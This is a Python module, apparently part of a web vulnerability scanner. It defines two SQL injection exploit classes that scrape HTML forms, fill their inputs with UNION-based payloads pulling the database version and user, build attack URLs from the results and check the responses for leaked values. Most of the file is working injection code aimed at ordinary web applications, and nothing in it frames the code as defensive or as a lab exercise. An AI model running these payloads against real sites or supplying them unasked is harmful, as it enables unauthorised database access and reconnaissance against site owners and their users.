from bs4 import BeautifulSoup
import urllib
import re

# Interface
class ExploitInterface:

    def check_if_exploit_found(self, html):
        pass

    def extract_data_for_payload(self, form):
        pass

    def did_attack_work(self, attack_response_text):
        pass

    def create_payload_url(self, payload_data_form, url_to_attack):
        pass

class ExploitSqliVersion(ExploitInterface):

    EXPLOIT_ID = 1
    EXPLOIT_PAYLOAD = "a' UNION ALL SELECT 1, @@version;#"
    EXPLOIT_WORKED_TEST_STRING = "a' UNION ALL SELECT 1, @@version;#"

    def check_if_exploit_found(self, html):

        soup = BeautifulSoup(html, 'html.parser')
        Forms = soup.find_all('form')

        if Forms:
            return self.extract_data_for_payload(Forms)
        else:
            return False

    def extract_data_for_payload(self, Forms):
        payload_forms_with_data = []

        for form in Forms:
            form_data = {}
            #Get our form data
            action = form.get('action')
            method = form.get('method')
            inputs = form.find_all('input')
            form_data['method'] =  str(method).upper()
            form_data['action'] =  str(action)
            form_inputs = {}

            for inp in inputs:
                form_inputs[inp.get('name')] = inp.get('value')

            form_data['form_inputs'] = form_inputs
            payload_forms_with_data.append(form_data)

        return payload_forms_with_data

    def did_attack_work(self, attack_response_text):
        if self.EXPLOIT_WORKED_TEST_STRING in attack_response_text:
                    match = re.search(r"\d\.\d\.\d\w+", attack_response_text)
                    payload_response =  match.group(0) if match else 'Check Further'
                    return {'status' : True, 'payload_response' : payload_response}
        return False

    def create_payload_url(self, payload_data_form, url_to_attack):

        for form in payload_data_form:

            if 'POST' not in str(form['method']):
                #We only want to target GET request for now
                attack_params = {}

                # Attach our payloads to inputs
                for k, v in form['form_inputs'].items():
                    # We Dont do anything to submit, parmeter value, leave it alone
                    if k == 'Submit':
                        attack_params[k] = v
                    else:
                        attack_params[k] = self.EXPLOIT_PAYLOAD

                #Construct our url+payload
                URL_WITH_PAYLOAD = (url_to_attack + "?" + urllib.urlencode(attack_params) + '#').encode("utf-8")
                
                return URL_WITH_PAYLOAD

                

class ExploitSqliUser(ExploitInterface):

    EXPLOIT_ID = 1
    EXPLOIT_PAYLOAD = "a' UNION ALL SELECT system_user(),user();#"
    EXPLOIT_WORKED_TEST_STRING = "a' UNION ALL SELECT system_user(),user();#"

    def check_if_exploit_found(self, html):

        soup = BeautifulSoup(html, 'html.parser')
        Forms = soup.find_all('form')

        if Forms:
            return self.extract_data_for_payload(Forms)
        else:
            return False

    def extract_data_for_payload(self, Forms):
        payload_forms_with_data = []

        for form in Forms:
            form_data = {}
            #Get our form data
            action = form.get('action')
            method = form.get('method')
            inputs = form.find_all('input')
            form_data['method'] =  str(method).upper()
            form_data['action'] =  str(action)
            form_inputs = {}

            for inp in inputs:
                form_inputs[inp.get('name')] = inp.get('value')

            form_data['form_inputs'] = form_inputs
            payload_forms_with_data.append(form_data)

        return payload_forms_with_data

    def did_attack_work(self, attack_response_text):
        if self.EXPLOIT_WORKED_TEST_STRING in attack_response_text:
                    match = re.search(r'[\w\.-]+@[\w\.-]+', attack_response_text)
                    payload_response =  match.group(0) if match else 'Check Further'
                    return {'status' : True, 'payload_response' : payload_response}
        return False

    def create_payload_url(self, payload_data_form, url_to_attack):

        for form in payload_data_form:

            if 'POST' not in str(form['method']):
                #We only want to target GET request for now
                attack_params = {}

                # Attach our payloads to inputs
                for k, v in form['form_inputs'].items():
                    # We Dont do anything to submit, parmeter value, leave it alone
                    if k == 'Submit':
                        attack_params[k] = v
                    else:
                        attack_params[k] = self.EXPLOIT_PAYLOAD

                #Construct our url+payload
                URL_WITH_PAYLOAD = (url_to_attack + "?" + urllib.urlencode(attack_params) + '#').encode("utf-8")
                
                return URL_WITH_PAYLOAD

EXPLOITS_LIST = []

def load_exploits():
    EXPLOITS_LIST.append(ExploitSqliUser())
    EXPLOITS_LIST.append(ExploitSqliVersion())
    return EXPLOITS_LIST
